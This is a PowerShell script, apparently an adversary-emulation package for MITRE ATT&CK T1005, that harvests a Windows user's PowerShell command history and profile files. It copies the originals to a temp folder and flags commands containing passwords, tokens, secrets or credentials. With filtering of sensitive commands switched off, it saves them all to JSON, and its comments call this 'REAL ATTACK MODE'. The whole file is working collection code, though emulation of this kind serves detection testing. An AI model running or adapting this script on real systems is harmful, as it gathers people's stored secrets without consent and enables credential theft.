# T1005.006a - Data from Local System: PowerShell History
# MITRE ATT&CK Enterprise - Collection Tactic
# ATOMIC ACTION: Extract PowerShell command history ONLY
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    return @{
        # REAL ATTACK MODE - Hardcoded variables for real attack
        "OUTPUT_BASE" = "$env:TEMP\mitre_results"
        "TIMEOUT" = 30

        # T1005.006a - REAL ATTACK MODE - Complete PowerShell history extraction
        T1005_006A_HISTORY_PATHS = @(
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
            "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
            "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1"
        )
        T1005_006A_MAX_LINES = 100000
        T1005_006A_FILTER_SENSITIVE = $false
        T1005_006A_INCLUDE_TIMESTAMPS = $true
        T1005_006A_ANALYZE_COMMANDS = $true
        T1005_006A_DETECT_CREDENTIALS = $true
        T1005_006A_COPY_ORIGINAL = $true
        T1005_006A_OUTPUT_MODE = "debug"
        T1005_006A_SILENT_MODE = $false
        T1005_006A_STEALTH_MODE = $false
        # Performance optimizations - REAL ATTACK MODE
        T1005_006A_MAX_COMMANDS = 10000
        T1005_006A_BATCH_SIZE = 100
        T1005_006A_ENABLE_TIMEOUT = $true
    }
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: PowerShell history extraction ONLY
    if (-not $Config.T1005_006A_SILENT_MODE) {
        Write-Host "[INFO] Starting atomic PowerShell history extraction..." -ForegroundColor Yellow
    }
    
    $historyResults = @{
        "action" =  "powershell_history_extraction"
        "technique_id" =  "T1005.006a"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    try {
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1005.006a-powershell_history"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        $historyFiles = @()
        $totalCommands = 0
        $sensitiveCommands = 0
        $allCommands = @()
        $startTime = Get-Date
        $circuitBreaker = $false
        
        foreach ($historyPath in $Config.T1005_006A_HISTORY_PATHS) {
            if (-not (Test-Path $historyPath)) {
                $historyFiles += @{
                    "file_path" = $historyPath
                    "file_exists" = $false
                    "error" =  "History file not found"
                }
                continue
            }
            
            # Circuit breaker check
            if ($Config.T1005_006A_ENABLE_TIMEOUT) {
                $elapsed = (Get-Date) - $startTime
                if ($elapsed.TotalSeconds -gt ($Config.TIMEOUT * 0.8)) {
                    $circuitBreaker = $true
                    if (-not $Config.T1005_006A_SILENT_MODE) {
                        Write-Host "[WARN] Circuit breaker activated - approaching timeout" -ForegroundColor Yellow
                    }
                    break
                }
            }
            
            if ($totalCommands -ge $Config.T1005_006A_MAX_COMMANDS) {
                $circuitBreaker = $true
                if (-not $Config.T1005_006A_SILENT_MODE) {
                    Write-Host "[WARN] Circuit breaker activated - max commands reached ($($Config.T1005_006A_MAX_COMMANDS))" -ForegroundColor Yellow
                }
                break
            }
            
            try {
                $fileInfo = Get-Item $historyPath
                $historyContent = Get-Content $historyPath -ErrorAction SilentlyContinue
                
                if (-not $historyContent) {
                    $historyFiles += @{
                        "file_path" = $historyPath
                        "error" =  "File is empty or could not be read"
                        "file_exists" = $true
                    }
                    continue
                }
                
                # OPTIMIZATION: Process in batches
                $commands = $historyContent | Select-Object -First $Config.T1005_006A_MAX_LINES
                $commandBatches = for ($i = 0; $i -lt $commands.Count; $i += $Config.T1005_006A_BATCH_SIZE) {
                    ,($commands[$i..([math]::Min($i + $Config.T1005_006A_BATCH_SIZE - 1, $commands.Count - 1))])
                }
                
                $historyFileInfo = @{
                    "file_path" = $historyPath
                    "file_size_bytes" = $fileInfo.Length
                    "file_size_kb" = [math]::Round($fileInfo.Length / 1KB, 2)
                    "last_modified" = $fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                    "total_lines" = $historyContent.Count
                    "processed_lines" = 0
                    "commands" = @()
                }
                
                # Copy original file if requested
                if ($Config.T1005_006A_COPY_ORIGINAL) {
                    $copyPath = Join-Path $outputDir "powershell_history_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
                    Copy-Item $historyPath $copyPath -Force
                    $historyFileInfo.copied_to = $copyPath
                }
                
                # Process commands in batches
                $lineNumber = 0
                foreach ($batch in $commandBatches) {
                    # Circuit breaker check per batch
                    if ($totalCommands -ge $Config.T1005_006A_MAX_COMMANDS) {
                        break
                    }
                    
                    foreach ($command in $batch) {
                        $lineNumber++
                        
                        if ([string]::IsNullOrWhiteSpace($command)) {
                            continue
                        }
                        
                        # Circuit breaker check per command
                        if ($totalCommands -ge $Config.T1005_006A_MAX_COMMANDS) {
                            break
                        }
                        
                        $commandInfo = @{
                            "line_number" = $lineNumber
                            "command" = $command.Trim()
                            "length" = $command.Trim().Length
                        }
                        
                        # Analyze command if requested (optimized)
                        if ($Config.T1005_006A_ANALYZE_COMMANDS) {
                            $cmdParts = $command.Trim() -split '\s+'
                            $commandInfo.cmdlet = $cmdParts[0]
                            $commandInfo.has_parameters = $command.Contains('-')
                            $commandInfo.has_pipes = $command.Contains('|')
                            $commandInfo.has_variables = $command.Contains('$')
                        }
                        
                        # Detect sensitive patterns (optimized)
                        $commandLower = $command.ToLower()
                        $isSensitive = $commandLower.Contains("password") -or 
                                     $commandLower.Contains("credential") -or 
                                     $commandLower.Contains("secret") -or 
                                     $commandLower.Contains("key") -or 
                                     $commandLower.Contains("token") -or 
                                     $commandLower.Contains("login") -or 
                                     $commandLower.Contains("auth") -or 
                                     $commandLower.Contains("convertto-securestring") -or 
                                     $commandLower.Contains("get-credential")
                        
                        if ($isSensitive) {
                            $sensitiveCommands++
                        }
                        
                        $commandInfo.is_sensitive = $isSensitive
                        
                        # Filter sensitive commands if requested
                        if ($Config.T1005_006A_FILTER_SENSITIVE -and $isSensitive) {
                            $commandInfo.command = "[FILTERED_SENSITIVE_COMMAND]"
                            $commandInfo.filtered = $true
                        }
                        
                        $historyFileInfo.commands += $commandInfo
                        $allCommands += $commandInfo
                        $totalCommands++
                        $historyFileInfo.processed_lines++
                    }
                    
                    # Circuit breaker check after each batch
                    if ($totalCommands -ge $Config.T1005_006A_MAX_COMMANDS) {
                        break
                    }
                }
                
                $historyFiles += $historyFileInfo
                
            } catch {
                $historyFiles += @{
                    "file_path" = $historyPath
                    "error" = $_.Exception.Message
                    "file_exists" = $true
                }
            }
            
            # Circuit breaker check after each file
            if ($circuitBreaker) {
                break
            }
        }
        
        # Generate command statistics
        $commandStats = @{
            "total_commands" = $totalCommands
            "sensitive_commands" = $sensitiveCommands
            "unique_cmdlets" = ($allCommands | Where-Object { $_.cmdlet } | Group-Object cmdlet | Measure-Object).Count
            "commands_with_parameters" = ($allCommands | Where-Object { $_.has_parameters }).Count
            "commands_with_pipes" = ($allCommands | Where-Object { $_.has_pipes }).Count
            "commands_with_variables" = ($allCommands | Where-Object { $_.has_variables }).Count
            "top_cmdlets" = ($allCommands | Where-Object { $_.cmdlet } | Group-Object cmdlet | Sort-Object Count -Descending | Select-Object -First 10 | ForEach-Object { @{ cmdlet = $_.Name; count = $_.Count } })
        }
        
        $historyResults.results = @{
            "status" = if ($circuitBreaker) { "partial_success" } else { "success" }
            "history_files_processed" = $historyFiles.Count
            "history_files" = $historyFiles
            "command_statistics" = $commandStats
            "circuit_breaker_activated" = $circuitBreaker
            "performance_metrics" = @{
                "execution_time_seconds" = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 2)
                "commands_per_second" = if (((Get-Date) - $startTime).TotalSeconds -gt 0) { 
                    [math]::Round($totalCommands / ((Get-Date) - $startTime).TotalSeconds, 2) 
                } else { 0 }
            }
            "configuration_used" = @{
                "max_lines" = $Config.T1005_006A_MAX_LINES
                "max_commands" = $Config.T1005_006A_MAX_COMMANDS
                "batch_size" = $Config.T1005_006A_BATCH_SIZE
                "enable_timeout_protection" = $Config.T1005_006A_ENABLE_TIMEOUT
            }
            "output_directory" = $outputDir
        }
        
        if (-not $Config.T1005_006A_SILENT_MODE) {
            $statusMsg = if ($circuitBreaker) { "PARTIAL SUCCESS" } else { "SUCCESS" }
            Write-Host "[$statusMsg] PowerShell history extraction completed: $totalCommands commands from $($historyFiles.Count) files" -ForegroundColor $(if ($circuitBreaker) { "Yellow" } else { "Green" })
        }
    }
    catch {
        $historyResults.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
            "commands_processed" = $totalCommands
        }
        
        if (-not $Config.T1005_006A_SILENT_MODE) {
            Write-Error "PowerShell history extraction failed: $($_.Exception.Message)"
        }
    }
    
    return $historyResults
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1005.006a-powershell_history"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    switch ($Config.T1005_006A_OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "PowerShell history: $($Data.results.command_statistics.total_commands) commands extracted"
            } else {
                $simpleOutput = "PowerShell history extraction failed: $($Data.results.error)"
            }
            
            if (-not $Config.T1005_006A_SILENT_MODE) {
                Write-Output $simpleOutput
            }
            
            $simpleOutput | Out-File -FilePath (Join-Path $outputDir "powershell_history_simple.txt") -Encoding UTF8
        }
        
        "stealth" {
            $jsonFile = Join-Path $outputDir "powershell_history.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "powershell_history.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if (-not $Config.T1005_006A_SILENT_MODE) {
                Write-Host "[DEBUG] PowerShell history data written to: $jsonFile" -ForegroundColor Cyan
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        if (-not $Config.T1005_006A_SILENT_MODE) {
            Write-Host "[COMPLETE] T1005.006a atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0
    }
    catch {
        if (-not $Config.T1005_006A_SILENT_MODE) {
            Write-Error "T1005.006a execution failed: $($_.Exception.Message)"
        }
        return 1
    }
}

exit (Main)


